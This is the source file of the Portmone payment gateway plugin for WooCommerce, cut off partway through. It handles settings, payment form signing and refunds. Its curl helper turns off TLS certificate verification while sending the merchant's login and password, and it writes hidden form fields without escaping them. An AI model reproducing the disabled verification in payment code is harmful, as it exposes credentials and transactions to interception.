<?php

/**
 * Plugin Name: Portmone-pay-for-woocommerce
 * Plugin URI: https://github.com/Portmone/WordPress
 * Description: Portmone Payment Gateway for WooCommerce.
 * Version: 4.0.1
 * Author: Portmone
 * Author URI: https://www.portmone.com.ua
 * Domain Path: /
 * License: Payment Card Industry Data Security Standard (PCI DSS)
 * License URI: https://www.portmone.com.ua/r3/uk/security/
 * Requires at least: 6.3
 * Requires PHP: 7.4
 * WC requires at least: 8.6
 * WC tested up to: 9.2.2
 *
 * @package Portmone
 */

use Automattic\WooCommerce\Utilities\OrderUtil;
use Automattic\WooCommerce\Blocks\Payments\PaymentMethodRegistry;
// Declaring extension compatibility with HPOS
add_action( 'before_woocommerce_init', function() {
    if ( class_exists( \Automattic\WooCommerce\Utilities\FeaturesUtil::class ) ) {
        \Automattic\WooCommerce\Utilities\FeaturesUtil::declare_compatibility( 'custom_order_tables', __FILE__, true );
    }
} );


add_action('before_woocommerce_init', function() {
    if (class_exists('\Automattic\WooCommerce\Utilities\FeaturesUtil'))
    {
        \Automattic\WooCommerce\Utilities\FeaturesUtil::declare_compatibility('cart_checkout_blocks', __FILE__, true);
    }
});


add_action('woocommerce_blocks_loaded', 'portmone_woocommerce_block_support');

function portmone_woocommerce_block_support()
{
    if (class_exists('Automattic\WooCommerce\Blocks\Payments\Integrations\AbstractPaymentMethodType'))
    {
        require_once dirname( __FILE__ ) . '/portmone-checkout-block.php';

        add_action(
            'woocommerce_blocks_payment_method_type_registration',
            function(PaymentMethodRegistry $payment_method_registry) {
                $container = Automattic\WooCommerce\Blocks\Package::container();
                $container->register(
                    WC_Portmone_Blocks::class,
                    function() {
                        return new WC_Portmone_Blocks();
                    }
                );
                $payment_method_registry->register($container->get(WC_Portmone_Blocks::class));
            },
            5
        );
    }
}


/**
 * Подгружаем файл переводов
 */
function portmone_languages() {
    load_plugin_textdomain("portmone-pay-for-woocommerce", false, basename(dirname(__FILE__))."/languages");
}
/**
 * Connecting language files
 */
add_action("init", "portmone_languages");

/**
 * Connecting images
 */
define('PORTMONE_IMGDIR', WP_PLUGIN_URL . "/" . plugin_basename(dirname(__FILE__)) . '/assets/img/');


/**
 * @param $links
 * @param $file
 *
 * @return mixed
 */
function plagin_links($links, $file) {
        $base = plugin_basename(__FILE__);
        if ($file == $base) {
            $links[] = '<a href="https://www.portmone.com.ua/r3/uk/security/" target="_blank">' .
                __('License') . '</a>';
        }
        return $links;
    }


/**
 * @param $links
 *
 * @return array
 */
function plagin_actions($links) {
    return array_merge(array(
        'settings' => '<a href="admin.php?page=wc-settings&tab=checkout&section=portmone">' .
            __( 'Настройки', 'portmone-pay-for-woocommerce' ) . '</a>'), $links);
}

add_filter("plugin_row_meta", "plagin_links", 10, 2);
add_filter("plugin_action_links_" . plugin_basename( __FILE__ ), "plagin_actions");


/**
 * Hook plug-in Portmone
 */
add_action("plugins_loaded", "woocommerce_portmone_init", 0);

/**
 * Инициализация плагина
 */
function woocommerce_portmone_init() {

    if (!class_exists('WC_Payment_Gateway')) {
        return;
    }

    function portmone_scripts () {
        wp_enqueue_script("portmone-js", plugin_dir_url(__FILE__) . 'assets/js/portmone.js', array('jquery'));
        wp_enqueue_style("portmone-css", plugin_dir_url(__FILE__) . 'assets/css/portmone_styles.css');
    }

    function portmone_admin_css () {
        wp_enqueue_style("portmone-checkout", plugin_dir_url(__FILE__) . 'assets/css/portmone_styles_admin.css');
    }

    // Добавить функции в список загрузки WP.
    add_action ("init", "portmone_scripts");
    add_action ("admin_init", "portmone_scripts");
    add_action ("admin_init", "portmone_admin_css");
    add_action ("admin_menu", "add_menu");
    add_action ("admin_notices", "portmone_notice");

    function add_menu() {
        $portmone = new WC_Portmone();
        $portmone->init_settings();
        if (isset($portmone->settings['show_admin_menu']) && $portmone->settings['show_admin_menu'] > 0) {
            add_menu_page(
                'Portmone.com',
                'Portmone.com',
                'manage_options',
                'wc-settings&tab=checkout&section=portmone#tab1',
                [
                    __CLASS__,
                    'page_options',
                ],
                plugin_dir_url( __FILE__ ) . 'assets/img/logo_200x200.png',
                $portmone->settings['show_admin_menu']
            );
        }
    }

    function portmone_notice() {
        $view_error = get_option( 'woocommerce_portmone_view_error');
        if ($view_error) {
            echo '<div class="notice notice-error is-dismissible">
                    <p><img style="height:14px" src="'.plugin_dir_url( __FILE__ ) . 'assets/img/logo_200x200.png'.'" alt=""> '.(new WC_Portmone())->method_title.' '.$view_error.' '.(new WC_Portmone())->m_lan['portmone_notice_description'].'</p>
                </div>';
        }
    }

    /**
     * Класс платежного плагина
     */
    class WC_Portmone extends WC_Payment_Gateway {

        const ORDER_PAYED       = 'PAYED';
        const ORDER_CREATED     = 'CREATED';
        const ORDER_REJECTED    = 'REJECTED';
        const ORDER_PREAUTH     = 'PREAUTH';
        const GATEWAY_URL       = 'https://www.portmone.com.ua/gateway/';
        const DEFAULT_PORTMONE_TIMEZONE = '+02';
        const DEFAULT_PORTMONE_PAYED_ID = 1185;
        private $t_lan          = [];  // массив переведенных текстов
        public $m_lan           = [];  // массив дефолтных текстов
        private $m_settings     = [];  // массив полученых настроек
        private $order_total    = 0;
        private $plugin_data;

        public $supports = array(
            'products',
            'refunds'
        );

        /**
         * Can be set to true if you want payment fields
         * to show on the checkout (if doing a direct integration).
         * @var boolean
         */
        public $has_fields = false;

        /**
         * Unique ID for the gateway
         * @var string
         */
        public $id = 'portmone';

        /**
         * Title of the payment method shown on the admin page.
         * @var string
         */
        public $method_title = 'Portmone';


        /**
         * Description of the payment method shown on the admin page.
         * @var  string
         */
        public $method_description = 'Allow customers to securely pay via Portmone (Credit/Debit Cards, NetBanking, UPI, Wallets)';

        /**
         * Icon URL, set in constructor
         * @var string
         */
        public $icon;

        // todo use
        /**
         * hpos enabled check
         * @var bool
         */
        public $isHposEnabled;

        public function __construct() {
            $this->isHposEnabled = false;

            // file added in woocommerce v7.1.0, maybe removed later
            if (class_exists('Automattic\WooCommerce\Utilities\OrderUtil') and
                OrderUtil::custom_orders_table_usage_is_enabled())
            {
                $this->isHposEnabled = true;
            }


            if( !function_exists('get_plugin_data') ){
                require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
            }
            $this->plugin_data = get_plugin_data(__FILE__);
            $this->currency = get_woocommerce_currencies();
            $this->m_lan = [
                'enabled_title'                 => 'Включить прием оплаты через Portmone.com',
                'enabled_label'                 => 'Включить Portmone.com модуль оплаты',
                'payee_id_title'                => 'Идентификатор магазина в системе Portmone.com (Payee ID)',
                'payee_id_span_title'           => 'Обязательно для заполнения',
                'payee_id_description'          => 'ID Интернет-магазина, предоставленный менеджером Portmone.com',
				'exp_time_title'                => 'Время на оплату',
				'exp_time_span_title'           => 'Обязательно для заполнения',
				'exp_time_description'          => 'Время отведенное на оплату через Portmone.com',
				'key_title'                		=> 'Ключ для подписи',
				'key_span_title'           		=> 'Обязательно для заполнения',
				'key_description'         		=> 'Ключ для подписи согласованный с Portmone',
				'login_title'                   => 'Логин Интернет-магазина в системе Portmone.com',
                'login_span_title'              => 'Обязательно для заполнения',
                'login_description'             => 'Логин Интернет-магазина, предоставленный менеджером Portmone.com',
                'password_title'                => 'Пароль Интернет-магазина в системе Portmone.com',
                'password_span_title'           => 'Обязательно для заполнения',
                'password_description'          => 'Пароль для Интернет-магазина, предоставленный менеджером Portmone.com',
                'title_title'                   => 'Название компании',
                'title_default'                 => 'Оплата заказа через Portmone.com',
                'title_description'             => 'Название Интернет-магазина, которое видит клиент при оплате',
                'description_title'             => 'Комментарий для клиента',
                'description_default'           => 'Сервис проведения платежей обеспечивается системой Portmone.com с использованием современного и безопасного механизма авторизации платежных карт. Служба поддержки Portmone.com: телефон +380(44)200 09 02, электронная почта: support@portmone.com',
                'description_description'       => 'Описание для клиента на странице оплаты заказа',
                'showlogo_title'                => 'Показать логотип на странице оплаты',
                'showlogo_label'                => 'Показать логотип Portmone.com при оформлении заказа',
                'showlogo_description'          => 'Отметьте, чтобы показать логотип Portmone.com',
                'show_admin_menu_title'         => 'Показать Portmone.com в списке меню административной панели',
                'show_admin_menu_description'   => 'Укажите порядковый номер отображения в списке меню. Если значение < 1, Portmone.com отображатся в списке меню не будет',
                'show_admin_menu_default'       => '1',
                'update_count_products_title'   => 'Изменять колличество товаров на складе после оплаты',
                'update_count_products_label'   => 'От общей суммы товаров на складе отнять товары оплаченного заказа',
                'update_count_products_description'=> 'Отметьте, чтобы изменять колличество товаров',
                'preauth_flag_title'            => 'Режим преавторизации',
                'preauth_flag_label'            => 'Средства только блокируются на карте клиента, но финансового списания со счета клиента не происходит',
                'preauth_flag_description'      => 'Отметьте, чтобы cредства только блокируются на карте клиента, но финансового списания со счета клиента не происходит',
                'page_mode_title'               => 'Включить режим показа на странице',
                'page_mode_label'               => 'Включить на странице способ оплаты',
                'page_mode_description'         => 'Включить режим страницы без перенаправления',
                'method_description'            => 'Платежный шлюз',
                'configuration'                 => 'Настройки',
                'information'                   => 'Информация',
                'IC_version'                    => 'Версия плагина',
                'payment_module'                => 'Платежный плагина Portmone.com',
                'submit_portmone'               => 'Оплатить через Portmone.com',
                'thankyou_text'                 => 'Спасибо за покупку!',
                'error_orderid'                 => 'При совершенииоплаты возникла ошибка. Свяжитесь с Интернет-магазином для проверки заказа',
                'error_order_in_portmone'       => 'В системе Portmone.com данного платежа нет, он возвращен или создан некорректно',
                'error_merchant'                => 'При совершении оплаты возникла ошибка. Данные Интернет-магазина некорректны',
                'order_rejected'                => 'При совершении оплаты возникла ошибка. Проверьте данные вашей карты и попробуйте провести оплату еще раз!',
                'number_pay'                    => 'Номер вашего заказа',
                'preauth_pay'                   => 'Оплачено с помощью Portmone.com (блокировка средств)',
                'successful_pay'                => 'Оплата совершена успешно через Portmone.com',
                'convert_money_title'           => 'Включить конвертацию в Гривны',
                'convert_money_label'           => 'Конвертировать валюту магазина из %1$s %2$s > в > %3$s, при оформлении заказа используя собственный курс конвертации который указать ниже (стандартно, конвертация проходит по курсу НБУ, на сайте портмоне)',
                'convert_money_description'     => 'Portmone.com принимает только Украинские гривны. Ваша сумма будет автоматически конвертирована в UAH в Portmone.com по курсу НБУ. Если вы хотите указать собственный курс конвертации, выберите этот пункт.',
                'exchange_rates_title'          => 'Курс валюты',
                'exchange_rates_description'    => 'Курс %1$s за 1 %2$s %3$s',
                'exchange_rates_default'        => '0',
                'license'                       => 'Лиценьзия',
                'error_auth'                    => 'Ошибка авторизации. Введен не верный логин или пароль',
                'WP_version_label'              => 'WP версия',
                'IDproduct'                     => 'ID товара',
                'quantity'                      => 'кол.',
                'price'                         => 'цена',
                'portmone_notice_description'   => 'ошибка пропадет после успешной оплаты',
                'repeated_payment'              => 'Статус этого заказа &ldquo;%s&rdquo; &mdash; его невозможно оплатить повторно',
                'send_email'                    => 'Email пользователю добавлен в очередь на отправку',
                'plagin_status_success'         => 'версия  актуальна для плагина',
                'plagin_status_warning'         => 'на этой версии плагин НЕ проверен и может работать нестабильно',
                'save_client_first_last_name_flag_title' => 'Зберегти ім\'я та прізвище клієнта',
                'save_client_first_last_name_flag_label' => 'Зберегти ім\'я та прізвище клієнта',
                'save_client_first_last_name_flag_description' => 'Ім\'я та прізвище клієнта береться з адреси, вказаної в замовленні. Узгоджується з менеджером Portmone',
                'save_client_phone_number_flag_title' => 'Зберегти телефон клієнта',
                'save_client_phone_number_flag_label' => 'Зберегти телефон клієнта',
                'save_client_phone_number_flag_description' => 'Телефон клієнта береться з адреси, зазначеної в замовленні. Узгоджується з менеджером Portmone',
                'save_client_email_flag_title' => 'Зберегти email клієнта',
                'save_client_email_flag_label' => 'Зберегти email клієнта',
                'save_client_email_flag_description' => 'Email клієнта береться з адреси, зазначеної в замовленні. Узгоджується з менеджером Portmone',
                'split_payment_title' => 'Параметри розщеплення',
                'split_payment_placeholder' => 'Desc1:payeeID1;amount1;Desc2:payeeID2;amount2;...',
                'split_payment_description' => '<p>• опис замовлення по кожному з одержувачів (Desc);</p><p>• ID компанії для кожного з одержувачів (payeeID);</p><p>• суму, яку необхідно зарахувати на рахунок кожного з одержувачів (amount);</p>',
            ];

            $this->f_lan = 'portmone-pay-for-woocommerce';

            foreach ($this->m_lan as  $key => $value) {
                $this->t_lan[$key] = __($value, $this->f_lan);
            }

            $letters_convert_money_label = array('%1$s', '%2$s', '%3$s');
            $fruit_convert_money_label   = array( '<b>'.$this->currency[get_woocommerce_currency()] , '('.get_woocommerce_currency().')</b>', '<b>'.$this->currency['UAH'].' (UAH)</b>');
            $this->t_lan['convert_money_label'] = str_replace($letters_convert_money_label, $fruit_convert_money_label, $this->t_lan['convert_money_label']);

            $letters_exchange_rates_description = array('%1$s', '%2$s', '%3$s');
            $fruit_exchange_rates_description   = array( '<b>'.$this->currency['UAH'].' (UAH)</b>' , '<b>'.$this->currency[get_woocommerce_currency()], '('.get_woocommerce_currency().')</b>' );
            $this->t_lan['exchange_rates_description'] = str_replace($letters_exchange_rates_description, $fruit_exchange_rates_description, $this->t_lan['exchange_rates_description']);

            $this->id = 'portmone';
            $this->method_title = 'Portmone';
            $this->method_description = $this->t_lan['method_description'];
            $this->has_fields = false;

            $this->init_settings();
            $this->m_settings = [
                'enabled',
                'payee_id',
                'login',
                'password',
                'title',
                'description',
                'preauth_flag',
                'showlogo',
                'show_admin_menu',
                'update_count_products',
				'exp_time',
				'key',
                'save_client_first_last_name_flag',
                'save_client_phone_number_flag',
                'save_client_email_flag',
                'split_payment'
            ];

            if (!empty($this->settings['showlogo']) && $this->settings['showlogo'] == "yes") {
                $this->icon = PORTMONE_IMGDIR . 'portmonepay.svg';
            }

            foreach ($this->m_settings as  $value) {
                $this->$value = $this->settings[$value] ?? '';
            }

            $this->message['message']   = "";
            $this->message['class']     = "";
            $this->init_form();

            add_action('woocommerce_thankyou_portmone', array($this, 'check_response') );
            add_action('woocommerce_update_options_payment_gateways_' . $this->id, array($this, 'process_admin_options'));
            add_action('admin_notices', 'portmone_notice');
            add_action('woocommerce_receipt_' . $this->id, array($this, 'receipt_page'));

            apply_filters( 'woocommerce_currency', get_option('woocommerce_currency') );
        }


        /**
         * Initializing the configuration form in the admin panel
         */
        function init_form() {
            $array1 = array(
                'enabled'              => array('title' => $this->t_lan['enabled_title'],
                    'type'             => 'checkbox',
                    'label'            => $this->t_lan['enabled_label'],
                    'default'          => 'no'),
                'payee_id'             => array('title' => $this->t_lan['payee_id_title'] . ' <span title="'. $this->t_lan['payee_id_span_title'] .'" class="red">*</span>',
                    'type'             => 'text',
                    'description'      => $this->t_lan['payee_id_description'],
                    'desc_tip'         => true),
                'login'                => array('title' => $this->t_lan['login_title'] . ' <span title="'. $this->t_lan['login_span_title'] .'" class="red">*</span>',
                    'type'             => 'text',
                    'description'      => $this->t_lan['login_description'],
                    'desc_tip'         => true),
                'password'             => array('title' => $this->t_lan['password_title'] . ' <span title="'. $this->t_lan['password_span_title'].'" class="red">*</span>',
                    'type'             => 'password',
                    'description'      => $this->t_lan['password_description'],
                    'desc_tip'         => true),
				'exp_time'             => array('title' => $this->t_lan['exp_time_title'] . ' <span title="'. $this->t_lan['exp_time_span_title'].'"></span>',
					'type'             => 'text',
					'description'      => $this->t_lan['exp_time_description'],
					'desc_tip'         => true),
				'key'             => array('title' => $this->t_lan['key_title'] . ' <span title="'. $this->t_lan['key_span_title'].'" class="red">*</span>',
					'type'             => 'text',
					'description'      => $this->t_lan['key_description'],
					'desc_tip'         => true)
            );
            if(get_woocommerce_currency() !== 'UAH') {
                $array2 = array(
                    'convert_money'    => array('title' => $this->t_lan['convert_money_title'],
                        'type'         => 'checkbox',
                        'label'        => $this->t_lan['convert_money_label'],
                        'default'      => 'no',
                        'description'  => $this->t_lan['convert_money_description'],
                        'desc_tip'     => true),
                    'exchange_rates'   => array('title' => $this->t_lan['exchange_rates_title'],
                        'type'         => 'text',
                        'default'      => $this->t_lan['exchange_rates_default'],
                        'description'  => $this->t_lan['exchange_rates_description'],
                        'desc_tip'     => true)
                );
            } else {
                $array2 = array();
            }
            $array3 = array (
                'title'                => array('title' => $this->t_lan['title_title'],
                    'type'             => 'text',
                    'default'          => $this->t_lan['title_default'],
                    'description'      => $this->t_lan['title_description'],
                    'desc_tip'         => true),
                'description'          => array('title' => $this->t_lan['description_title'],
                    'type'             => 'textarea',
                    'default'          => $this->t_lan['description_default'],
                    'description'      => $this->t_lan['description_description'],
                    'desc_tip'         => true),
                'preauth_flag'         => array('title' => $this->t_lan['preauth_flag_title'],
                    'type'             => 'checkbox',
                    'label'            => $this->t_lan['preauth_flag_label'],
                    'default'          => 'no',
                    'description'      => $this->t_lan['preauth_flag_description'],
                    'desc_tip'         => true),
                /*'showlogo'             => array('title' => $this->t_lan['showlogo_title'],
                    'type'             => 'checkbox',
                    'label'            => $this->t_lan['showlogo_label'],
                    'default'          => 'yes',
                    'description'      => $this->t_lan['showlogo_description'],
                    'desc_tip'         => true),*/
                'show_admin_menu'      => array('title' => $this->t_lan['show_admin_menu_title'],
                    'type'             => 'number',
                    'default'          => $this->t_lan['show_admin_menu_default'],
                    'description'      => $this->t_lan['show_admin_menu_description'],
                    'desc_tip'         => true),
                'update_count_products'=> array('title' => $this->t_lan['update_count_products_title'],
                    'type'             => 'checkbox',
                    'label'            => $this->t_lan['update_count_products_label'],
                    'default'          => 'yes',
                    'description'      => $this->t_lan['update_count_products_description'],
                    'desc_tip'         => true),
                'save_client_first_last_name_flag'   => array('title' => $this->t_lan['save_client_first_last_name_flag_title'],
                    'type'             => 'checkbox',
                    'label'            => $this->t_lan['save_client_first_last_name_flag_label'],
                    'default'          => 'no',
                    'description'      => $this->t_lan['save_client_first_last_name_flag_description'],
                    'desc_tip'         => true),
                'save_client_phone_number_flag'   => array('title' => $this->t_lan['save_client_phone_number_flag_title'],
                    'type'             => 'checkbox',
                    'label'            => $this->t_lan['save_client_phone_number_flag_label'],
                    'default'          => 'no',
                    'description'      => $this->t_lan['save_client_phone_number_flag_description'],
                    'desc_tip'         => true),
                'save_client_email_flag'         => array('title' => $this->t_lan['save_client_email_flag_title'],
                    'type'             => 'checkbox',
                    'label'            => $this->t_lan['save_client_email_flag_label'],
                    'default'          => 'no',
                    'description'      => $this->t_lan['save_client_email_flag_description'],
                    'desc_tip'         => true),
                'split_payment'        => array('title' => $this->t_lan['split_payment_title'],
                    'type'             => 'text',
                    'default'          => '',
                    'description'      => $this->t_lan['split_payment_description'],
                    'placeholder'      => $this->t_lan['split_payment_placeholder'],
                    'desc_tip'         => true),
            );

            $this->form_fields = array_merge($array1, $array2, $array3);
        }

        /**
         * Admin Panel Options
         * - Options for bits like 'title' and availability on a country-by-country basis
         **/
        public function admin_options() {

            ob_start();
            $this->generate_settings_html();
            $settings = ob_get_contents();
            ob_end_clean();

            $variables = array(
                '{version}'           => $this->plugin_data['Version'],
                '{logo}'              => '<h3><img src="'. PORTMONE_IMGDIR . 'portmonepay.svg' . '" alt="' . $this->method_title . '"></h3>',
                '{configuration}'     => $this->t_lan['configuration'],
                '{information}'       => $this->t_lan['information'],
                '{settings}'          => $settings ,
                '{error}'             => '',
                '{upgrade_notice}'    => '',
                '{payment_module}'    => $this->t_lan['payment_module'],
                '{IC_version}'        => $this->t_lan['IC_version'],
                '{WC_version_label}'  => __('WC Version', 'woocommerce'),
                '{WC_version}'        => WC()->version,
                '{WC_actual}'         => $this->WC_actual(),
                '{WP_version_label}'  => __('WP Version', 'woocommerce'),
                '{WP_version}'        => get_bloginfo('version') . ' (' . get_bloginfo('language') . ')',
                '{WP_actual}'         => $this->WP_actual()
            );

            $template = file_get_contents(plugin_dir_path(__FILE__) . 'view/admin.php');
            foreach ($variables as $key => $value) {
                $template = str_replace($key, $value, $template);
            }

            echo $template;
        }

        function WC_actual() {
            if (WC()->version >= $this->plugin_data["WC requires at least"] && WC()->version <= $this->plugin_data["WC tested up to"]) {
                return '<span style="color: green">('.$this->t_lan['plagin_status_success'].')</span>';
            } else {
                return '<span style="color: #e7a511;">('.$this->t_lan['plagin_status_warning'].')</span>';
            }
        }

        function WP_actual() {
            if (get_bloginfo('version') >= $this->plugin_data["RequiresWP"]) {
                return '<span style="color: green">('.$this->t_lan['plagin_status_success'].')</span>';
            } else {
                return '<span style="color: #e7a511;">('.$this->t_lan['plagin_status_warning'].')</span>';
            }
        }

        /**
         * Receipt Page
         **/
        function receipt_page($order_id) {
            echo $this->generate_portmone_form($order_id);
        }

        /**
         * Generate payu button link
         **/
        function generate_portmone_form($order_id) {
            $description_order = '';
            $order = wc_get_order($order_id);

            if (isset($this->settings['convert_money']) &&
                isset($this->settings['exchange_rates']) &&
                $this->settings['convert_money'] == 'yes' &&
                $this->settings['exchange_rates'] > 0
            ){
                 $this->order_total = round($order->get_total() * $this->settings['exchange_rates'] , 2);
                 $this->bill_currency = 'UAH';
            } else {
                 $this->order_total = $order->get_total();
                 $this->bill_currency = $this->getCurrency();
            }

            $order_id = ($this->payee_id == self::DEFAULT_PORTMONE_PAYED_ID)? $order_id.'_'.time() : $order_id ;
            $current_user = wp_get_current_user();
            $userId = (!empty($current_user->ID))? '&user='.$current_user->ID : '';

            $portmone_args = array(
                'payee_id'           => $this->payee_id,
                'shop_order_number'  => $order_id,
                'bill_amount'        => $this->order_total,
                'bill_currency'      => $this->bill_currency,
                'success_url'        => $order->get_checkout_order_received_url().'&status=success'.$userId,
                'failure_url'        => $order->get_checkout_order_received_url().'&status=failure'.$userId,
				'exp_time'           => $this->exp_time,
				'lang'               => $this->getLanguage(),
                'preauth_flag'       => $this->getPreauthFlag(),
                'attribute1'         => $this->getAttribute1($order),
                'attribute2'         => $this->getAttribute2($order),
                'attribute3'         => $this->getAttribute3($order),
                'attribute5'         => $this->split_payment,
                'cms_module_name'    => json_encode(['name' => 'WordPress', 'v' => $this->plugin_data['Version']]),
                'encoding'           => 'UTF-8'
            );
			$key						=$this->key;
			$portmone_args['dt']       			= date('Ymdhis');
			$signature					= $portmone_args['payee_id'].$portmone_args['dt'].bin2hex($portmone_args['shop_order_number']).$portmone_args['bill_amount'] ;
			$signature 					= strtoupper($signature).strtoupper(bin2hex($this->login));
			$signature 					= strtoupper(hash_hmac('sha256', $signature, $key));
			$portmone_args['signature']    		= $signature;
			if ($description_order != '') {
                $portmone_args['description'] = $description_order;
            }

            if ($order->meta_exists('_shop_order_number')) {
                $order->update_meta_data( '_shop_order_number', $portmone_args['shop_order_number'] );
            } else {
                $order->add_meta_data( '_shop_order_number', $portmone_args['shop_order_number'] );
            }
            $order->save();

            $out = '';
                foreach ($portmone_args as $key => $value) {
                    $portmone_args_array[] = "<input type='hidden' name='$key' value='$value'/>";
                }
                $out .= '<form action="' . self::GATEWAY_URL . '" method="post" id="portmone_payment_form" name="portmone_payment_form">
                    ' . implode('', $portmone_args_array) . '
                </form>';

            return $out;
        }

        /**
         * @param int $order_id
         *
         * @return array
         */
        function process_payment($order_id) {
            $order = wc_get_order($order_id);

            if (version_compare( WOOCOMMERCE_VERSION , '2.1.0', '>=')) {
                $payment_url = $order->get_checkout_payment_url(true);
            } else {
                $payment_url = get_permalink(get_option('woocommerce_pay_page_id'));
            }
            return array('result' => 'success', 'redirect' => add_query_arg('order_pay', $order_id, $payment_url));
        }

        /**
         * Process a refund.
         *
         * @param  int    $order_id Order ID.
         * @param  float  $amount Refund amount.
         * @param  string $reason Refund reason.
         * @return bool|WP_Error
         */
        public function process_refund( $order_id, $amount = null, $reason = '' ) {
            $order = wc_get_order( $order_id );

            if ( ! $this->can_refund_order( $order ) ) {
                return new WP_Error( 'error', __( 'Refund failed.', 'woocommerce' ) );
            }

            $paymentMethod = $order->get_payment_method();
            if ($paymentMethod != 'portmone') {
                return new WP_Error( 'error', __( 'Замовлення не було сплачено через систему Portmone', 'portmone-pay-for-woocommerce' ) );
            }

            $shopOrderNumber = $order->get_meta( '_shop_order_number' );
            if (empty($shopOrderNumber)) {
                return new WP_Error( 'error', __( 'Значення для shop_order_number не можуть бути порожніми', 'portmone-pay-for-woocommerce' ) );
            }

            $shopBillId = $this->getShopBillId($shopOrderNumber);
            if ( is_wp_error( $shopBillId ) ) {
                return new WP_Error( 'error', $shopBillId->get_error_message() );
            }

            $data = array(
                "method" => "return",
                "login" => $this->login,
                "password" => $this->password,
                "shop_bill_id" => $shopBillId,
                'return_amount' => $amount,
                'attribute1' => $reason,
                'encoding' => 'UTF-8',
                'lang' => 'uk',
            );

            $result_portmone = $this->curlRequest(self::GATEWAY_URL, $data);
            if ($result_portmone === false) {
                return new WP_Error( 'error', __('Помилка під час надсилання запиту на отримання номера замовлення в системі Portmone', 'portmone-pay-for-woocommerce' ) );
            }

            $parseXml = $this->parseXml($result_portmone);
            if ($parseXml === false) {
                return new WP_Error( 'error', __('Помилка авторизації. Введено неправильний логін або пароль', 'portmone-pay-for-woocommerce' ) );
            }

            $orderData = $parseXml->order;
            if ($orderData->error_code != 0 ) {
                return new WP_Error( 'error', $orderData->error_message );
            }

            if ($orderData->status == 'RETURN') {
                $order->add_order_note(
                /* translators: 1: Refund amount, 2: Refund ID */
                    sprintf( __( 'Refunded %1$s - Refund ID: %2$s', 'woocommerce' ), $orderData->bill_amount, $orderData->shop_bill_id )
                );
                return true;
            }

            return new WP_Error( 'error', __('Невідома помилка', 'portmone-pay-for-woocommerce' ) );;
        }

        private function getShopBillId($shopOrderNumber)
        {
            $data = array(
                "method" => "result",
                "payee_id" => $this->payee_id,
                "login" => $this->login,
                "password" => $this->password,
                "shop_order_number" => $shopOrderNumber,
            );

            $result_portmone = $this->curlRequest(self::GATEWAY_URL, $data);
            if ($result_portmone === false) {
                return new WP_Error( 'error', __( 'Помилка під час надсилання запиту на отримання номера замовлення в системі Portmone', 'portmone-pay-for-woocommerce' ) );
            }

            $parseXml = $this->parseXml($result_portmone);
            if ($parseXml === false) {
                return new WP_Error( 'error', __('Помилка авторизації. Введено неправильний логін або пароль', 'portmone-pay-for-woocommerce' ) );
            }

            delete_option( 'woocommerce_portmone_view_error' );
            $payee_id_return = (array)$parseXml->request->payee_id;
            $order_data = (array)$parseXml->orders->order;

            if ($payee_id_return[0] != $this->payee_id) {
                return new WP_Error( 'error', __($this->t_lan['error_merchant'], 'portmone-pay-for-woocommerce' ) );
            }

            if (count($parseXml->orders->order) == 0) {
                return new WP_Error( 'error', __($this->t_lan['error_order_in_portmone'], 'portmone-pay-for-woocommerce' ) );
            } elseif (count($parseXml->orders->order) > 1){
                $no_pay = false;
                foreach($parseXml->orders->order as $order ){
                    $status = (array)$order->status;
                    if ($status[0] == self::ORDER_PAYED || $status[0] == self::ORDER_PREAUTH) {
                        return $order->shop_bill_id;
                    }
                }
                if ($no_pay == false) {
                    return new WP_Error( 'error', __($this->t_lan['error_order_in_portmone'], 'portmone-pay-for-woocommerce' ) );
                }
            }

            if ($order_data['status'] == self::ORDER_REJECTED) {
                return new WP_Error( 'error', __('Неможливо відшкодувати. Оплату скасовано', 'portmone-pay-for-woocommerce' ) );
            }

            if ($order_data['status'] == self::ORDER_CREATED) {
                return new WP_Error( 'error', __('Неможливо відшкодувати. Замовлення не було сплачено', 'portmone-pay-for-woocommerce' ) );
            }

            if ($order_data['status'] == self::ORDER_PREAUTH || $order_data['status'] == self::ORDER_PAYED) {
                return $order_data['shop_bill_id'];
            }

            return new WP_Error( 'error', __('Невідома помилка', 'portmone-pay-for-woocommerce' ) );;
        }

        /**
         * Return page after payment
         **/
        private function getCurrency() {
            if(in_array(get_woocommerce_currency(), ['UAH', 'USD', 'EUR', 'GBP', 'PLN', 'KZT'])) {
                return get_woocommerce_currency();
            } else {
                return 'UAH';
            }
        }

        /**
         * Definition of the WP language
         **/
        private function getLanguage() {
            $lang = substr(get_bloginfo('language'), 0, 2);
            if ($lang == 'ru' || $lang == 'en' || $lang == 'uk') {
                return  $lang;
            } else {
                return  'en';
            }
        }

        private function getPreauthFlag() {
            return ($this->preauth_flag == 'yes')? 'Y' : 'N' ;
        }

        private function getAttribute1(\WC_Order $order) {
            return ($this->save_client_first_last_name_flag == 'yes') ? $order->get_billing_first_name()  . ' ' . $order->get_billing_last_name() : '';
        }

        private function getAttribute2(\WC_Order $order) {
            return ($this->save_client_phone_number_flag == 'yes') ? $order->get_billing_phone() : '';
        }

        private function getAttribute3(\WC_Order $order) {
            return ($this->save_client_email_flag == 'yes') ? $order->get_billing_email() : '';
        }

        /**
         * A request to verify the validity of payment in Portmone
         **/
        function curlRequest($url, $data) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            $response = curl_exec($ch);
            $httpCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if (200 !== intval($httpCode)) {
                return false;
            }
            return $response;
        }

        /**
         * @param  WC_Order  $order
         * @param            $view
         */
        function send_notification_email(\WC_Order $order, $view) {
            $wc_email = WC()->mailer()->get_emails()[$view];
            $wc_email_admin = WC()->mailer()->get_emails()['WC_Email_New_Order'];

            $wc_email_admin->settings['subject'] = $wc_email->settings['subject'] = __('{site_title}');
            $wc_email_admin->settings['heading'] = $wc_email->settings['heading'] = __('Новый заказ');

            $wc_email->recipient = $order->get_billing_email();
            $wc_email->trigger($order->get_id(), $order);
            $order->add_order_note($this->t_lan['send_email']);

            $wc_email_admin->recipient = get_option('admin_email');
            $wc_email_admin->trigger($order->get_id(), $order);
        }

        /**
         * Parsing XML response from Portmone
         **/
        function parseXml($string) {
